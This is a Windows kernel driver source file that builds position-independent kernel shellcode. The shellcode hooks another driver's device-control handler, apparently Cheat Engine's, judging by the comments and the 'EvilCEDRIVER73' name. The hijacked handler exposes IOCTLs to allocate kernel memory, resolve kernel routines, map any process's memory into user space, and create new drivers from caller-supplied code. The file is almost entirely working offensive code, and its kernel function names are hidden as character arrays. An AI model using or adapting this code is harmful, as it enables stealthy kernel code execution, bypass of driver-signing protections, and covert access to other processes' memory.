#pragma warning( disable: 4100 4101 4103 4189 4996 6271 6066 6273 6328)
#pragma runtime_checks("", off)
#pragma optimize("", off)
#pragma strict_gs_check(off)

#include <ntifs.h>
#include <minwindef.h>
#include <wdm.h>

#define RL_DEVICE_NAME L"\\Device\\KernelPISCreator"
#define RL_SYM_NAME L"\\??\\KernelPISCreator"
#define RL_USER_SYM_NAME L"\\\\.\\KernelPISCreator"

#define IOCTL_UNKNOWN_BASE					FILE_DEVICE_UNKNOWN
#define IOCTL_ALLOCATEMEM_NONPAGED    CTL_CODE(IOCTL_UNKNOWN_BASE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MAP_MEMORY						CTL_CODE(IOCTL_UNKNOWN_BASE, 0x084d, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_GETPROCADDRESS		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0802, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_CREATE_DRIVER		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0806, METHOD_BUFFERED, FILE_WRITE_ACCESS)
#define IOCTL_UNMAP_MEMORY					CTL_CODE(IOCTL_UNKNOWN_BASE, 0x084e, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_GETPROCADDRESS_ADDRESS		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0803, METHOD_BUFFERED, FILE_WRITE_ACCESS)



struct KernelPisParameters
{
	LPVOID MmGetSystemRoutineAddress;
	LPVOID HookFunctionAddress;
	USHORT dummy2;
};

// function prototypes

extern "C" 
NTSTATUS
__declspec(safebuffers)
__declspec(noinline) PicStart(UINT64 StartContext);
#pragma alloc_text(".PIS", "PicStart")


extern "C"
NTSTATUS
__declspec(safebuffers)
__declspec(noinline)
__stdcall  HookedDispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp);
#pragma alloc_text(".PIS2", "HookedDispatchIoctl")


typedef PVOID(__stdcall* pMmGetSystemRoutineAddress)(_In_ PUNICODE_STRING  SystemRoutineName);
typedef NTSTATUS(__stdcall* pRtlCopyMemory)(_In_  PVOID Destination, _In_  const PVOID Source, _In_ SIZE_T Length);
typedef PEPROCESS(__stdcall* pIoGetCurrentProcess)();
typedef HANDLE(__stdcall* pPsGetProcessId)(_In_ PEPROCESS Process);
typedef ULONG(__stdcall* pDbgPrint)(_In_ PCSTR Format, ...);
typedef NTSTATUS(__stdcall* pObReferenceObjectByName)(
	__in PUNICODE_STRING ObjectName,
	__in ULONG Attributes,
	__in_opt PACCESS_STATE AccessState,
	__in_opt ACCESS_MASK DesiredAccess,
	__in POBJECT_TYPE ObjectType,
	__in KPROCESSOR_MODE AccessMode,
	__inout_opt PVOID ParseContext,
	__out PVOID* Object);
typedef LONG_PTR(__stdcall* pObfDereferenceObject)(_In_  PVOID Object);
typedef LONG_PTR(__stdcall* pRtlInitUnicodeString)(PUNICODE_STRING  DestinationString, PCWSTR SourceString);
typedef PVOID(__stdcall* p_InterlockedExchangePointerString)(PVOID * Target, _In_ PVOID Value);
typedef NTSTATUS(__stdcall* pIoCreateDriver)(_In_  PUNICODE_STRING DriverName, _In_  PDRIVER_INITIALIZE InitializationFunction);
typedef PVOID(__stdcall* pExAllocatePool)(__drv_strictTypeMatch(__drv_typeExpr) _In_ POOL_TYPE PoolType, _In_ SIZE_T NumberOfBytes);

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	DbgPrint("Hello From original CreateClose!");
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

void Unload(_In_ PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(RL_SYM_NAME);
	// delete symbolic link
	IoDeleteSymbolicLink(&symLink);

	// delete device object
	IoDeleteDevice(DriverObject->DeviceObject);

	DbgPrint("PISCreator unloaded\n");
}


NTSTATUS OriginalDispatchIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	DbgPrint("Hello From OriginalDispatchIoctl!");
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS
__declspec(safebuffers)
__declspec(noinline)
__stdcall  HookedDispatchIoctl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	//DbgPrint("Hooked DispatchIoctl\n");

	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
	PIO_STACK_LOCATION     irpStack = NULL;
	ULONG IoControlCode;

	NT_ASSERT(Irp->CurrentLocation <= Irp->StackCount + 1);
	irpStack=  Irp->Tail.Overlay.CurrentStackLocation;

	IoControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;

	switch (IoControlCode) {

	case IOCTL_ALLOCATEMEM_NONPAGED:
	{
		//DbgPrint("Entering IOCTL_ALLOCATEMEM_NONPAGED\n");

		PVOID address;
		size_t size;
		struct input {
			UINT64 MmGetSystemRoutineAddress;
			SIZE_T Size;
		} *inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		// Get MmGetSystemRoutineAddress
		pMmGetSystemRoutineAddress MmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)inp->MmGetSystemRoutineAddress;

		if (NULL == MmGetSystemRoutineAddress)
			return STATUS_UNSUCCESSFUL;

		// Function name and strings
		WCHAR ExAllocatePoolString[] = { 'E', 'x', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'P', 'o', 'o', 'l', 0 };
		
		// Create UNICODE_STRING structures
		UNICODE_STRING exAllocatePool = RTL_CONSTANT_STRING(ExAllocatePoolString);
		
		// Get function addresses
		pExAllocatePool ExAllocatePool = (pExAllocatePool)MmGetSystemRoutineAddress(&exAllocatePool);
		
		size = inp->Size;
		address = ExAllocatePool(NonPagedPool, size);
		*(PUINT64)Irp->AssociatedIrp.SystemBuffer = 0;
		*(PUINT_PTR)Irp->AssociatedIrp.SystemBuffer = (UINT_PTR)address;

		if (address == 0)
			ntStatus = STATUS_UNSUCCESSFUL;
		else
		{
			//DbgPrint("Alloc success. Cleaning memory... (address=%p size=%d)\n", address, (int)size);
			
			//RtlZeroMemory(address, size);
			unsigned char* ptr = (unsigned char*)address;
			while (size-- > 0)
				*ptr++ = 0;
				
			ntStatus = STATUS_SUCCESS;
			Irp->IoStatus.Information = sizeof UINT_PTR;
		}

		break;
	}

	case IOCTL_GETPROCADDRESS_ADDRESS:
	{

		UINT64 result;
		struct input {
			UINT64 MmGetSystemRoutineAddress;
		}*inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		result = (UINT64)MmGetSystemRoutineAddress;
		ntStatus = STATUS_SUCCESS;

		RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, &result, 8);
		
		Irp->IoStatus.Information = sizeof UINT64;

		break;
	}
	case IOCTL_GETPROCADDRESS:
	{
		//DbgPrint("Entering IOCTL_GETPROCADDRESS\n");

		PVOID functionAddress;
		UINT64 result;
		struct input {
			UINT64 MmGetSystemRoutineAddress;
			UINT64 functionName;
		}*inp = (input*)Irp->AssociatedIrp.SystemBuffer;

		// Get MmGetSystemRoutineAddress
		pMmGetSystemRoutineAddress MmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)inp->MmGetSystemRoutineAddress;

		if (NULL == MmGetSystemRoutineAddress)
			return STATUS_UNSUCCESSFUL;

		// Function name and strings
		WCHAR* functionNameString = (WCHAR*)inp->functionName;

		// Create UNICODE_STRING structures
		UNICODE_STRING functionName = RTL_CONSTANT_STRING(functionNameString);
			
		// Get function addresses
		functionAddress = MmGetSystemRoutineAddress(&functionName);

		if (functionAddress != NULL) {
			//DbgPrint("MmGetSystemRoutineAddress solved %ls: %p\n", (WCHAR*)inp->functionName, functionAddress);
			result = (UINT64)functionAddress;
			ntStatus = STATUS_SUCCESS;
		}
		else {
			//DbgPrint("MmGetSystemRoutineAddress failed %ls\n", (WCHAR*)inp->functionName);
			result = NULL;
			ntStatus = STATUS_UNSUCCESSFUL;
		}

		//RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, &result, 8);
		char* d = (char*)Irp->AssociatedIrp.SystemBuffer;
		const char* s = (const char*)&result;
		size_t len = 8;
		while (len--)
			*d++ = *s++;

		Irp->IoStatus.Information = sizeof UINT64;

		break;
	}

	case IOCTL_UNMAP_MEMORY:
	{
		struct input
		{
			UINT64 MDL;
			UINT64 Address;
		} *inp;

		PMDL mdl;

		inp = (input*)Irp->AssociatedIrp.SystemBuffer;
		mdl = (PMDL)(UINT_PTR)inp->MDL;

		MmUnmapLockedPages((PMDL)(UINT_PTR)inp->Address, mdl);
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);

		ntStatus = STATUS_SUCCESS; //no BSOD means success ;)

		break;
	}

	case IOCTL_MAP_MEMORY:
	{
		struct input
		{
			UINT64 TargetPID;
			UINT64 address;
			DWORD size;
		} *inp;

		struct output
		{
			UINT64 MDL;
			UINT64 Address;
		} *outp;

		KAPC_STATE apc_state;
		PEPROCESS selectedprocess;
		PMDL FromMDL = NULL;

		inp = (input*)Irp->AssociatedIrp.SystemBuffer;
		outp = (output*)Irp->AssociatedIrp.SystemBuffer;

		DbgPrint("IOCTL_CE_MAP_MEMORY\n");
		DbgPrint("address %x size %d\n", inp->address, inp->size);
		ntStatus = STATUS_UNSUCCESSFUL;

		DbgPrint("From PID %d\n", inp->TargetPID);
		if (PsLookupProcessByProcessId((PVOID)(UINT_PTR)(inp->TargetPID), &selectedprocess) == STATUS_SUCCESS)
		{
			
			//RtlZeroMemory(&apc_state, sizeof(apc_state));
			unsigned char* ptr = (unsigned char*)&apc_state;
			size_t size = sizeof(apc_state);
			while (size-- > 0)
				*ptr++ = 0;

			KeStackAttachProcess((PRKPROCESS)selectedprocess, &apc_state);


			FromMDL = IoAllocateMdl((PVOID)(UINT_PTR)inp->address, inp->size, FALSE, FALSE, NULL);
			if (FromMDL)
				MmProbeAndLockPages(FromMDL, KernelMode, IoReadAccess);

			KeUnstackDetachProcess(&apc_state);
			ObDereferenceObject(selectedprocess);
		}


		if (FromMDL)
		{
			DbgPrint("FromMDL is valid\n");

			outp->Address = (UINT64)MmMapLockedPagesSpecifyCache(FromMDL, UserMode, MmWriteCombined, NULL, FALSE, NormalPagePriority);
			outp->MDL = (UINT64)FromMDL;
			ntStatus = STATUS_SUCCESS;
		}
		else
			DbgPrint("FromMDL==NULL\n");

		break;
	}

	case IOCTL_CREATE_DRIVER:
	{
		//DbgPrint("Entering IOCTL_CREATE_DRIVER\n");

		struct input {
			UINT64 MmGetSystemRoutineAddress;
			UINT64 DriverInitialize;
			UINT64 driverName;
		}*inp = (input*)Irp->AssociatedIrp.SystemBuffer;
		
		// Get MmGetSystemRoutineAddress
		pMmGetSystemRoutineAddress MmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)inp->MmGetSystemRoutineAddress;

		if (NULL == MmGetSystemRoutineAddress)
			return STATUS_UNSUCCESSFUL;

		// Function name and strings
		WCHAR IoCreateDriverString[] = { 'I', 'o', 'C', 'r', 'e', 'a', 't', 'e', 'D', 'r', 'i', 'v', 'e', 'r', 0 };
		WCHAR* DriverNameString = (WCHAR*)inp->driverName;

		// Create UNICODE_STRING structures
		UNICODE_STRING ioCreateDriver = RTL_CONSTANT_STRING(IoCreateDriverString);
		UNICODE_STRING driverName = RTL_CONSTANT_STRING(DriverNameString);

		// Get function addresses
		pIoCreateDriver IoCreateDriver = (pIoCreateDriver)MmGetSystemRoutineAddress(&ioCreateDriver);
	
		ntStatus = IoCreateDriver(&driverName, (PDRIVER_INITIALIZE)inp->DriverInitialize);
		
		//ntStatus = STATUS_SUCCESS;
		DbgPrint("IoCreateDriver at 0x%p \n", IoCreateDriver);
		DbgPrint("IoCreateDriver(%ls, 0x%p) = %lx\n", driverName.Buffer, inp->DriverInitialize, ntStatus);
		
		break;
	}


	default:
		ntStatus = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	Irp->IoStatus.Status = ntStatus;

	// Set # of bytes to copy back to user-mode...
	if (irpStack) 
	{
		if (ntStatus == STATUS_SUCCESS)
			Irp->IoStatus.Information = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
		else
			Irp->IoStatus.Information = 0;

		IoCompleteRequest(Irp, IO_NO_INCREMENT);
	}

	DbgPrint("Return Hooked DispatchIoctl ntStatus: 0x%x\n", ntStatus);

	return ntStatus;
}


NTSTATUS
__declspec(safebuffers)
__declspec(noinline)
__stdcall PicStart(UINT64 StartContext)
{
	
	if (NULL == StartContext)
		return STATUS_UNSUCCESSFUL;

	KernelPisParameters* pisParameters = (KernelPisParameters*)StartContext;
	
	// Get MmGetSystemRoutineAddress
	pMmGetSystemRoutineAddress MmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)pisParameters->MmGetSystemRoutineAddress;
	if (NULL == MmGetSystemRoutineAddress)
		return STATUS_UNSUCCESSFUL;
	
	// Get hook function address
	PDRIVER_DISPATCH HookFunctionAddress = (PDRIVER_DISPATCH)pisParameters->HookFunctionAddress;
	if (NULL == HookFunctionAddress)
		return STATUS_UNSUCCESSFUL;

	// Function name and strings
	WCHAR DbgPrintString[] = { 'D', 'b', 'g', 'P', 'r', 'i', 'n', 't', '\0' };
	WCHAR  greeting[] = { 'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'K', 'e', 'r', 'n', 'e', 'l', ' ', 'm', 'o', 'd', 'e', ' ', 's', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', '!', '\0' };
	WCHAR end[] = { 'S', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', ' ', 's', 'u', 'c', 'c', 'e', 's', 's', 'f', 'u', 'l', 'l', 'y', ' ', 'e', 'x', 'e', 'c', 'u', 't', 'e', 'd', '!', '\0' };
	CHAR param[] = { '%', 'l', 's', 0 };
	// \\driver\\EvilCEDRIVER73
	//WCHAR driverNameString[] = { '\\', 'd', 'r', 'i', 'v', 'e', 'r', '\\', 'E', 'v', 'i', 'l', 'C', 'E', 'D', 'R', 'I', 'V', 'E', 'R', '7', '3', 0};
	WCHAR driverObjectNameString[] = { '\\', 'D', 'r', 'i', 'v', 'e', 'r', '\\', 'K', 'e', 'r', 'n', 'e', 'l', 'P', 'I', 'S', 'C', 'r', 'e', 'a', 't', 'o', 'r', 0 };
	WCHAR ObReferenceObjectByNameString[] = { 'O', 'b', 'R', 'e', 'f', 'e', 'r', 'e', 'n', 'c', 'e', 'O', 'b', 'j', 'e', 'c', 't', 'B', 'y', 'N', 'a', 'm', 'e', 0 };
	WCHAR ObfDereferenceObjectString[] = { 'O', 'b', 'f', 'D', 'e', 'r', 'e', 'f', 'e', 'r', 'e', 'n', 'c', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
	WCHAR IoDriverObjectTypeString[] = { 'I', 'o', 'D', 'r', 'i', 'v', 'e', 'r', 'O', 'b', 'j', 'e', 'c', 't', 'T', 'y', 'p', 'e', 0 };
	WCHAR InterlockedExchangePointerString[] = { 'I', 'n', 't', 'e', 'r', 'l', 'o', 'c', 'k', 'e', 'd', 'E', 'x', 'c', 'h', 'a', 'n', 'g', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', 0 };
	CHAR DebugString[] = { 'T', 'a', 'r', 'g', 'e', 't', ' ', 'd', 'r', 'i', 'v', 'e', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ':', ' ', '0', 'x', '%', 'p', 0 };
	CHAR DebugString2[] = {'T', 'a', 'r', 'g', 'e', 't', ' ', 'd', 'r', 'i', 'v', 'e', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 'n', 'a', 'm', 'e', ' ', ':', ' ',  '%', 'l', 's', 0};
	
	// Create UNICODE_STRING structures
	UNICODE_STRING dbgPrint = RTL_CONSTANT_STRING(DbgPrintString);
	UNICODE_STRING driverObjectName = RTL_CONSTANT_STRING(driverObjectNameString);
	UNICODE_STRING obReferenceObjectByNameString = RTL_CONSTANT_STRING(ObReferenceObjectByNameString);
	UNICODE_STRING obfDereferenceObjectString = RTL_CONSTANT_STRING(ObfDereferenceObjectString);
	UNICODE_STRING ioDriverObjectTypeString = RTL_CONSTANT_STRING(IoDriverObjectTypeString);
	UNICODE_STRING interlockedExchangePointerString = RTL_CONSTANT_STRING(InterlockedExchangePointerString);

	// Get function addresses
	pDbgPrint myDbgPrint = (pDbgPrint)MmGetSystemRoutineAddress(&dbgPrint);
	pObReferenceObjectByName obReferenceObjectByName = (pObReferenceObjectByName)MmGetSystemRoutineAddress(&obReferenceObjectByNameString);
	pObfDereferenceObject obfDereferenceObject = (pObfDereferenceObject)MmGetSystemRoutineAddress(&obfDereferenceObjectString);
	POBJECT_TYPE* ioDriverObjectType = (POBJECT_TYPE*)MmGetSystemRoutineAddress(&ioDriverObjectTypeString);
	p_InterlockedExchangePointerString interlockedExchangePointer = (p_InterlockedExchangePointerString)MmGetSystemRoutineAddress(&interlockedExchangePointerString);

	myDbgPrint(param, greeting); // Hello From Kernel mode shellcode!

	// Local variables
	PDRIVER_OBJECT DriverObject;
	NTSTATUS status;

	myDbgPrint(DebugString2, driverObjectName.Buffer); // Target driver object name : 0x%ls

	status = obReferenceObjectByName(&driverObjectName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		*ioDriverObjectType,
		KernelMode,
		NULL,
		(PVOID*)&DriverObject);

	if (!NT_SUCCESS(status)) {
		return STATUS_UNSUCCESSFUL;
	}

	myDbgPrint(DebugString, DriverObject); // Target driver object: 0x%p
	UINT64 originalFunctionAddress = NULL;
	// Hook IRP_MJ_DEVICE_CONTROL
	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
		if (i == IRP_MJ_DEVICE_CONTROL ) {
			//interlockedExchangePointer((PVOID*)&DriverObject->MajorFunction[i], HookedDispatchIoctl);
			originalFunctionAddress = (UINT64)DriverObject->MajorFunction[i];
			DriverObject->MajorFunction[i] = HookFunctionAddress;
		}
	}
	
	obfDereferenceObject(DriverObject);
	myDbgPrint(param, end); // Shellcode successfully executed!

	return STATUS_SUCCESS;
}

NTSTATUS DriverInit(PDRIVER_OBJECT DriverObject)
{

	DriverObject->DriverUnload = Unload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OriginalDispatchIoctl; 

	UNICODE_STRING devName = RTL_CONSTANT_STRING(RL_DEVICE_NAME);
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create device (0x%08X)\n", status);
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(RL_SYM_NAME);
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to create symbolic link (0x%08X)\n", status);
		IoDeleteDevice(DeviceObject);
		return status;
	}


	return STATUS_SUCCESS;
}

extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
{

	DriverInit(DriverObject);
	
	DbgPrint("DriverObject 0x%p Name: %ls",  DriverObject, DriverObject->DriverName.Buffer);

	KernelPisParameters pisParameters;
	pisParameters.MmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
	pisParameters.HookFunctionAddress = HookedDispatchIoctl;
	pisParameters.dummy2 = NULL;

	IRP FakeIRP;
	struct user_input
	{
		UINT64	functionaddress; //function address to call
		UINT64	parameters;
	} in = { (UINT64)PicStart, (UINT64)&pisParameters };
	FakeIRP.AssociatedIrp.SystemBuffer = &in;
	
	// from CE IOPLDispatcher.c

	typedef NTSTATUS(__stdcall* PARAMETERLESSFUNCTION)(UINT64 parameters);
	PARAMETERLESSFUNCTION functiontocall;
	NTSTATUS ntStatus;
	struct input
	{
		UINT64	functionaddress; //function address to call
		UINT64	parameters;
	} *inp = (input*)FakeIRP.AssociatedIrp.SystemBuffer;
	
	
	functiontocall = (PARAMETERLESSFUNCTION)(UINT_PTR)(inp->functionaddress);

	__try
	{
		ntStatus = functiontocall(inp->parameters);

		DbgPrint("Still alive\n");
		ntStatus = STATUS_SUCCESS;
	}
	__except (1)
	{
		DbgPrint("Exception occured\n");
		ntStatus = STATUS_UNSUCCESSFUL;
	}	

	// from CE  IOPLDispatcher.c end

	return STATUS_SUCCESS;
}
